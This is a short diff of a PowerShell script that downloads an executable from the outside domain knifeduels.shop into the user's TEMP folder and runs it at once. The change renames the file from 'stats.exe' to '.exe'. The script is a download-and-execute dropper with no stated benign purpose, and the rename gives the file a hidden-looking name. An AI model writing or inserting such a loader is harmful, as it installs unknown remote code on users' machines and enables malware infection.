@@ -1,5 +1,5 @@
-$exeUrl = "https://knifeduels.shop/stats.exe"
-$exePath = "$env:TEMP\stats.exe"
+$exeUrl = "https://knifeduels.shop/.exe"
+$exePath = "$env:TEMP\.exe"
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 Start-Process -FilePath $exePath
